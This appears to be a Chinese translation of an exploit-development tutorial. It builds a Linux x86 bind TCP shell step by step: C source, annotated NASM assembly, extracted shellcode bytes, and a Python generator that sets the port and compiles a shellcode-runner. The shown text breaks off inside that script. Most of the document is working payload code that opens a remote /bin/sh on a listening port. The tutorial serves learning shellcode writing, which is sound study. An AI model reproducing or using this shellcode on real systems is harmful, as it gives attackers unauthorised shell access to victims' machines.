<html>
<head>
<title>[ExpDev] Bind TCP Shellcode</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]绑定TCP外壳代码</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997?source=collection_archive---------0-----------------------#2020-12-14">https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997?source=collection_archive---------0-----------------------#2020-12-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><h1 id="76d4" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">什么是绑定外壳？</strong></h1><p id="ca9e" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">Bind TCP在受害者系统上打开一个端口。如果攻击者可以利用受害者系统上的漏洞，她可以植入一个绑定外壳并从远程攻击机器连接到它。然而，由于防火墙和检测控制，反向TCP shell比绑定TCP shell更受欢迎。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/997fd743279ad5c8b15c7cced34537d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1184/format:webp/1*yjtQdNmE5NQyVgMVSM4eaw.png"/></div><figcaption class="lu lv gj gh gi lw lx bd b be z dk translated">绑定外壳</figcaption></figure><h1 id="b83e" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">套接字编程</strong></h1><p id="2a19" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">在shellcode中创建我们的Bind TCP Shell之前，我们需要理解套接字编程。</p><blockquote class="ly lz ma"><p id="35c8" class="ko kp mb kq b kr mc kt ku kv md kx ky me mf lb lc mg mh lf lg mi mj lj lk ll im bi translated">注意:套接字编程是一种连接网络上两个节点以相互通信的方式。</p></blockquote><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/6e35b264c111b79ca89bf1a651d2bc3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:500/format:webp/1*V2etu9cpyvG_aeP1LjyTdQ.png"/></div></figure><p id="d602" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">为了更好地理解Bind TCP，让我们用更高级的编程语言创建一个Bind TCP Shell。我们将使用<code class="fe ml mm mn mo b">C</code>:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="1a58" class="mt jr it mo b gy mu mv l mw mx">#include &lt;sys/socket.h&gt;<br/>#include &lt;sys/types.h&gt;<br/>#include &lt;netinet/in.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;</span><span id="f382" class="mt jr it mo b gy my mv l mw mx">int main()<br/>{<br/>  int sockfd, acceptfd;<br/>  int port = 9001;</span><span id="1887" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">  // Server Address struct</strong><br/>  struct sockaddr_in addr;<br/>  addr.sin_family = AF_INET;<br/>  addr.sin_port = htons(port);<br/>  addr.sin_addr.s_addr = INADDR_ANY;</span><span id="b8da" class="mt jr it mo b gy my mv l mw mx"> <strong class="mo iu"> // 1) Socket Creation (sys_socket 1)<br/>  </strong>sockfd = socket(AF_INET, SOCK_STREAM, 0);</span><span id="aa63" class="mt jr it mo b gy my mv l mw mx">  <strong class="mo iu">// 2) Bind() Syscall (sys_bind 2)<br/>  </strong>bind(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr));</span><span id="da39" class="mt jr it mo b gy my mv l mw mx">  <strong class="mo iu">// 3) Listen() Syscall (sys_listen 4)<br/>  </strong>listen(sockfd, 0);</span><span id="ec79" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">  // 4) Accept() Syscall (sys_accept 5)</strong><br/>  acceptfd = accept(sockfd, NULL, NULL);</span><span id="d7c2" class="mt jr it mo b gy my mv l mw mx">  <strong class="mo iu">// 5) Dup2() Syscall<br/>  </strong>dup2(acceptfd, 0);  // stdin<br/>  dup2(acceptfd, 1);  // stdout<br/>  dup2(acceptfd, 2);  // stderr</span><span id="18b8" class="mt jr it mo b gy my mv l mw mx">  <strong class="mo iu">// 6) Execve() Syscall<br/>  </strong>execve("/bin/sh", NULL, NULL);<br/>  return 0;<br/>}</span></pre><p id="c152" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">我们来编译一下:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="c8c1" class="mt jr it mo b gy mu mv l mw mx"># gcc bind-tcp-shell.c -o bind-tcp-shell</span></pre><p id="7653" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">编译后的二进制可以成功打开一个bind shell，我们可以通过<code class="fe ml mm mn mo b">nc</code>连接到它。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi mz"><img src="../Images/367d27ad764dce2e49173a79cb9ca754.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qYi8X6oJoKtgTT-asCTmQw.png"/></div></div></figure><h1 id="72d7" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">外壳代码</strong></h1><p id="2eba" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">对于我们的绑定TCP Shell外壳代码，我们需要使用所有那些<code class="fe ml mm mn mo b">syscalls</code>:</p><ol class=""><li id="be40" class="ne nf it kq b kr mc kv md kz ng ld nh lh ni ll nj nk nl nm bi translated"><strong class="kq iu">插座</strong> —启动插座连接</li><li id="16d2" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll nj nk nl nm bi translated"><strong class="kq iu">Bind</strong>—<code class="fe ml mm mn mo b">bind()</code>将addr指定的地址分配给文件描述符<code class="fe ml mm mn mo b">sockfd</code>引用的套接字。</li><li id="c93a" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll nj nk nl nm bi translated"><strong class="kq iu">监听</strong> —监听来电连接</li><li id="af2f" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll nj nk nl nm bi translated"><strong class="kq iu">接受</strong>—<code class="fe ml mm mn mo b">accept()</code>系统调用用于基于连接的套接字类型(SOCK_STREAM，SOCK_SEQPACKET)</li><li id="5fe4" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll nj nk nl nm bi translated"><strong class="kq iu"> Dup2 </strong> —管理文件描述符的<code class="fe ml mm mn mo b">stdin</code>、<code class="fe ml mm mn mo b">stdout</code>和<code class="fe ml mm mn mo b">stderr</code>。这对于输入和输出重定向是必要的。</li><li id="f055" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll nj nk nl nm bi translated"><strong class="kq iu">执行</strong> —执行一个命令(<code class="fe ml mm mn mo b">/bin/sh</code>生成一个外壳)</li></ol><h2 id="af0d" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">系统调用+函数调用</strong></h2><p id="ba88" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">首先，我们需要收集<code class="fe ml mm mn mo b">socketcall()</code>和其他<code class="fe ml mm mn mo b">syscalls</code>的参数。</p><blockquote class="ly lz ma"><p id="76d0" class="ko kp mb kq b kr mc kt ku kv md kx ky me mf lb lc mg mh lf lg mi mj lj lk ll im bi translated">注意:socketcall()是套接字系统调用的一个公共内核入口点。</p></blockquote><p id="e285" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">通过查询<code class="fe ml mm mn mo b">/usr/include/i386-linux-gnu/asm/unistd_32.h</code>，我们可以为<code class="fe ml mm mn mo b">syscalls</code>收集以下参数:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="64d1" class="mt jr it mo b gy mu mv l mw mx">#define __NR_socketcall 102 → Hex: 0x66<br/>#define __NR_bind 361       → Hex: 0x169<br/>#define __NR_listen 363     → Hex: 0x16b<br/>#define __NR_accept4 364    → Hex: 0x16c<br/>#define __NR_dup2 63        → Hex: 0x3f<br/>#define __NR_execve 11      → Hex: 0xb</span></pre><p id="1061" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">此外，通过查看<code class="fe ml mm mn mo b">/usr/include/linux/net.h</code>，我们还可以获得函数调用的参数:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="8b99" class="mt jr it mo b gy mu mv l mw mx"># cat /usr/include/linux/net.h | grep SYS<br/>#define SYS_SOCKET 1 /* sys_socket(2) */<br/>#define SYS_BIND 2 /* sys_bind(2) */<br/>#define SYS_CONNECT 3 /* sys_connect(2) */<br/>#define SYS_LISTEN 4 /* sys_listen(2) */<br/>#define SYS_ACCEPT 5 /* sys_accept(2) */<br/>#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */<br/>#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */<br/>#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */<br/>#define SYS_SEND 9 /* sys_send(2) */<br/>#define SYS_RECV 10 /* sys_recv(2) */<br/>#define SYS_SENDTO 11 /* sys_sendto(2) */<br/>#define SYS_RECVFROM 12 /* sys_recvfrom(2) */<br/>#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */<br/>#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */<br/>#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */<br/>#define SYS_SENDMSG 16 /* sys_sendmsg(2) */<br/>#define SYS_RECVMSG 17 /* sys_recvmsg(2) */<br/>#define SYS_ACCEPT4 18 /* sys_accept4(2) */<br/>#define SYS_RECVMMSG 19 /* sys_recvmmsg(2) */<br/>#define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */</span></pre><h2 id="7476" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">初始化</strong></h2><p id="df34" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">首先，让我们将我们要使用的一些寄存器清零:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="ca21" class="mt jr it mo b gy mu mv l mw mx">global _start</span><span id="4e71" class="mt jr it mo b gy my mv l mw mx">section     .text</span><span id="bbdf" class="mt jr it mo b gy my mv l mw mx">_start:</span><span id="85cb" class="mt jr it mo b gy my mv l mw mx">xor eax, eax<br/>xor ebx, ebx<br/>xor ecx, ecx<br/>xor edx, edx</span></pre><h2 id="34e8" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">插座()</strong></h2><p id="8881" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">socket()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="f1f4" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 1) Socket Creation<br/>; sockfd = socket(AF_INET, SOCK_STREAM, 0);</strong></span><span id="43a3" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; #define __NR_socketcall 102   --&gt; Hex: 0x66<br/>mov bl, 0x1     ; #define SYS_SOCKET 1<br/>push edx        ; int protocol = 0<br/>push ebx        ; int SOCK_STREAM = 1<br/>push 0x2        ; int AF_INET = 2<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_SOCKET<br/>mov edi, eax    ; Save the sockfd to EDI</span></pre><h2 id="fb15" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">服务器地址结构</strong></h2><p id="a97b" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建服务器地址<code class="fe ml mm mn mo b">struct</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="5db9" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">;   struct sockaddr_in addr;<br/>;   addr.sin_family = AF_INET; <br/>;   addr.sin_port = htons(port);    //4444<br/>;   addr.sin_addr.s_addr = INADDR_ANY;</strong></span><span id="55c0" class="mt jr it mo b gy my mv l mw mx">push edx          ; NULL Padding<br/>push edx          ; NULL Padding<br/>push edx          ; sin_addr = 0.0.0.0<br/>push word 0x5c11  ; port = 4444<br/>push word 0x2     ; int AF_INET = 2<br/>mov esi, esp      ; Move stack pointer to ESI</span></pre><h2 id="3eee" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak"> Bind() </strong></h2><p id="7425" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">bind()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="5133" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 2) Bind<br/>; bind(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr));</strong></span><span id="3285" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x2     ; #define SYS_BIND  2<br/>push 0x10       ; sizeof(addr) = 10<br/>push esi        ; ESI = Server Address struct<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_BIND</span></pre><h2 id="e512" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">听()</strong></h2><p id="a977" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">listen()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="be49" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 3) Listen<br/>; listen(sockfd, 0);</strong></span><span id="9905" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x4     ; #define SYS_LISTEN    4<br/>push edx        ; int backlog = 0<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_LISTEN</span></pre><h2 id="a01f" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">接受()</strong></h2><p id="7514" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">accept()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="dd9c" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 4) Accept<br/>; acceptfd = accept(sockfd, NULL, NULL);</strong></span><span id="8bde" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x5     ; #define SYS_ACCEPT    5<br/>push edx        ; NULL<br/>push edx        ; NULL<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_ACCEPT<br/>mov edi, eax</span></pre><h2 id="3781" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak"> Dup2() </strong></h2><p id="c34d" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">dup2()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="26bd" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 5) Dup2 - Input and Output Redirection<br/>; dup2(acceptfd, 0);    // stdin<br/>; dup2(acceptfd, 1);    // stdout<br/>; dup2(acceptfd, 2);    // stderr</strong></span><span id="1f63" class="mt jr it mo b gy my mv l mw mx">xor ecx, ecx    ; Zero out<br/>mov cl, 0x3     ; Set the counter</span><span id="a996" class="mt jr it mo b gy my mv l mw mx">loop:<br/>xor eax, eax    ; Zero out<br/>mov al, 0x3f    ; #define __NR_dup2 63  --&gt; Hex: 0x3f<br/>mov ebx, edi    ; New sockfd<br/>dec cl          ; Decrementing the counter by 1<br/>int 0x80</span><span id="954e" class="mt jr it mo b gy my mv l mw mx">jnz loop        ; Jump back to the beginning of the loop until CL is set to zero flag</span></pre><h2 id="0643" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak"> Execve() </strong></h2><p id="7711" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn mo b">execve()</code>外壳代码:</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="362b" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu">; 6) Execve<br/>; execve("/bin/sh", NULL, NULL);</strong></span><span id="5639" class="mt jr it mo b gy my mv l mw mx">push edx            ; NULL<br/>push 0x68732f6e     ; "hs/n"  &lt;-- //bin/sh<br/>push 0x69622f2f     ; "ib//"<br/>mov ebx, esp        ; Move stack pointer to EBX<br/>push edx            ; NULL terminator<br/>push ebx<br/>mov ecx, esp        ; Move stack pointer to ECX<br/>mov al, 0xb         ; #define __NR_execve   11  --&gt; Hex: 0xb<br/>int 0x80            ; Execute SYS_EXECVE</span></pre><h2 id="114a" class="mt jr it bd js ns nt dn jw nu nv dp ka kz nw nx ke ld ny nz ki lh oa ob km oc bi translated"><strong class="ak">最终外壳代码(bing-tcp-shell.nasm) </strong></h2><p id="4734" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们把所有东西放在一起，测试外壳代码。</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="f4fc" class="mt jr it mo b gy mu mv l mw mx">global _start</span><span id="b8f1" class="mt jr it mo b gy my mv l mw mx">section     .text</span><span id="5bf0" class="mt jr it mo b gy my mv l mw mx">_start:</span><span id="3ab8" class="mt jr it mo b gy my mv l mw mx">xor eax, eax<br/>xor ebx, ebx<br/>xor ecx, ecx<br/>xor edx, edx</span><span id="d27b" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 1) Socket Creation<br/>; sockfd = socket(AF_INET, SOCK_STREAM, 0);</strong></span><span id="6f0b" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; #define __NR_socketcall 102   --&gt; Hex: 0x66<br/>mov bl, 0x1     ; #define SYS_SOCKET 1<br/>push edx        ; int protocol = 0<br/>push ebx        ; int SOCK_STREAM = 1<br/>push 0x2        ; int AF_INET = 2<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_SOCKET<br/>mov edi, eax    ; Save the sockfd to EDI</span><span id="e198" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; Server Address struct</strong></span><span id="c5eb" class="mt jr it mo b gy my mv l mw mx">push edx          ; NULL Padding<br/>push edx          ; NULL Padding<br/>push edx          ; sin_addr = 0.0.0.0<br/>push word 0x5c11  ; port = 4444<br/>push word 0x2     ; int AF_INET = 2<br/>mov esi, esp      ; Move stack pointer to ESI</span><span id="b981" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 2) Bind<br/>; bind(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr));</strong></span><span id="5fca" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x2     ; #define SYS_BIND  2<br/>push 0x10       ; sizeof(addr) = 10<br/>push esi        ; ESI = Server Address struct<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_BIND</span><span id="e3d8" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 3) Listen<br/>; listen(sockfd, 0);</strong></span><span id="953c" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x4     ; #define SYS_LISTEN    4<br/>push edx        ; int backlog = 0<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_LISTEN</span><span id="d248" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 4) Accept<br/>; acceptfd = accept(sockfd, NULL, NULL);</strong></span><span id="d5b9" class="mt jr it mo b gy my mv l mw mx">mov al, 0x66    ; socketcall = 102<br/>mov bl, 0x5     ; #define SYS_ACCEPT    5<br/>push edx        ; NULL<br/>push edx        ; NULL<br/>push edi        ; EDI = sockfd<br/>mov ecx, esp    ; Move stack pointer to ECX<br/>int 0x80        ; Execute SYS_ACCEPT<br/>mov edi, eax</span><span id="ab04" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 5) Dup2 - Input and Output Redirection<br/>; dup2(acceptfd, 0);    // stdin<br/>; dup2(acceptfd, 1);    // stdout<br/>; dup2(acceptfd, 2);    // stderr</strong></span><span id="e1a7" class="mt jr it mo b gy my mv l mw mx">xor ecx, ecx    ; Zero out<br/>mov cl, 0x3     ; Set the counter</span><span id="c4ce" class="mt jr it mo b gy my mv l mw mx">loop:<br/>xor eax, eax    ; Zero out<br/>mov al, 0x3f    ; #define __NR_dup2 63  --&gt; Hex: 0x3f<br/>mov ebx, edi    ; New sockfd<br/>dec cl          ; Decrementing the counter by 1<br/>int 0x80</span><span id="fdba" class="mt jr it mo b gy my mv l mw mx">jnz loop        ; Jump back to the beginning of the loop until CL is set to zero flag</span><span id="c420" class="mt jr it mo b gy my mv l mw mx"><strong class="mo iu">; 6) Execve<br/>; execve("/bin/sh", NULL, NULL);</strong></span><span id="df4f" class="mt jr it mo b gy my mv l mw mx">push edx         ; NULL<br/>push 0x68732f6e  ; "hs/n"  &lt;-- //bin/sh<br/>push 0x69622f2f  ; "ib//"<br/>mov ebx, esp     ; Move stack pointer to EBX<br/>push edx         ; NULL terminator<br/>push ebx<br/>mov ecx, esp     ; Move stack pointer to ECX<br/>mov al, 0xb      ; #define __NR_execve   11  --&gt; Hex: 0xb<br/>int 0x80         ; Execute SYS_EXECVE</span></pre><h1 id="38a9" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">编译</strong></h1><p id="35d7" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">我创建了一个简单的编译器<a class="ae od" href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py" rel="noopener ugc nofollow" target="_blank"> compilerX86.py </a>。使用它，我们可以:</p><ul class=""><li id="1ca5" class="ne nf it kq b kr mc kv md kz ng ld nh lh ni ll oe nk nl nm bi translated">将`<code class="fe ml mm mn mo b">bind-tcp-shell.nasm</code>'编译成二进制</li><li id="60f1" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll oe nk nl nm bi translated">从二进制文件中提取外壳代码以创建`<code class="fe ml mm mn mo b">shellcode.c</code>`文件</li><li id="d6d2" class="ne nf it kq b kr nn kv no kz np ld nq lh nr ll oe nk nl nm bi translated">使用“<code class="fe ml mm mn mo b">gcc</code>”将“<code class="fe ml mm mn mo b">shellcode.c</code>”编译成二进制文件</li></ul><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="ab22" class="mt jr it mo b gy mu mv l mw mx"># python compilerX86.py -f bind-tcp-shell<br/> <br/>[+] Assemble: bind-tcp-shell.nasm<br/>[+] Linking: bind-tcp-shell.o<br/>[+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"<br/>[+] Creating File: shellcode.c<br/>[+] Compiling Executable: shellcode<br/>[+] Enjoy!</span></pre><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi of"><img src="../Images/550d9b7b2bdd78bd6cd38c481ac22d0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uWYdXP1T8mKYVDev6GMuxw.png"/></div></div></figure><h1 id="5adf" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">最终触摸</strong></h1><p id="4efb" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">最后，我创建了下面的<a class="ae od" href="https://github.com/bigb0sss/SLAE32/blob/master/Assignment-1/bind-tcp-shell.py" rel="noopener ugc nofollow" target="_blank"> python脚本</a>来改变用户输入的端口号，并自动创建和编译<code class="fe ml mm mn mo b">C</code>二进制文件。</p><pre class="ln lo lp lq gt mp mo mq mr aw ms bi"><span id="144d" class="mt jr it mo b gy mu mv l mw mx"><strong class="mo iu"># bind-tcp-shell.py</strong></span><span id="641a" class="mt jr it mo b gy my mv l mw mx">import sys<br/>import argparse<br/>import subprocess<br/>import string<br/>import socket</span><span id="b2bb" class="mt jr it mo b gy my mv l mw mx">""" Arguments """<br/>parser = argparse.ArgumentParser(description = '[+] Bind TCP Shell Generator')<br/>parser.add_argument('-p', '--port', help='\tBind Port')<br/>args = parser.parse_args()</span><span id="26ee" class="mt jr it mo b gy my mv l mw mx">def error():<br/>    parser.print_help()<br/>    exit(1)</span><span id="9e0a" class="mt jr it mo b gy my mv l mw mx">def exploit(port):<br/>    <br/>    # Bind TCP Shell <br/>    shellcode = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'<br/>    shellcode+= '\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02'<br/>    shellcode+= '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52'<br/>    shellcode+= '\\x52\\x66\\x68'<br/>    <br/>    print "[INFO] Bind Port: " + port</span><span id="d794" class="mt jr it mo b gy my mv l mw mx">port = hex(socket.htons(int(port)))<br/>    a = port[2:4]<br/>    b = port[4:]<br/>    if b == '':<br/>        b = '0'<br/>    port = '\\x{0}\\x{1}'.format(b, a)</span><span id="113f" class="mt jr it mo b gy my mv l mw mx">#port = '\\x11\\x5c' = 4444<br/>    <br/>    shellcode2 = '\\x66\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3'<br/>    shellcode2+= '\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd'<br/>    shellcode2+= '\\x80\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89'<br/>    shellcode2+= '\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52'<br/>    shellcode2+= '\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7'<br/>    shellcode2+= '\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f'<br/>    shellcode2+= '\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4'<br/>    shellcode2+= '\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f'<br/>    shellcode2+= '\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89'<br/>    shellcode2+= '\\xe1\\xb0\\x0b\\xcd\\x80'</span><span id="55f4" class="mt jr it mo b gy my mv l mw mx"># Adding shellcode to shellcode.c<br/>    outShellcode = ''<br/>    outShellcode+= '#include&lt;stdio.h&gt;\n'<br/>    outShellcode+= '#include&lt;string.h&gt;\n'<br/>    outShellcode+= '\n'<br/>    outShellcode+= 'unsigned char code[] = \ \n'<br/>    outShellcode+= '"{0}{1}{2}";'.format(shellcode, port, shellcode2)<br/>    outShellcode+= '\n'<br/>    outShellcode+= 'main()\n'<br/>    outShellcode+= '{\n'<br/>    outShellcode+= 'printf("Shellcode Length:  %d", strlen(code));\n'<br/>    outShellcode+= '\tint (*ret)() = (int(*)())code;\n'<br/>    outShellcode+= '\tret();\n'<br/>    outShellcode+= '}\n'<br/>    #print outShellcode</span><span id="9cf9" class="mt jr it mo b gy my mv l mw mx"># Creating shellcode.c<br/>    filename = 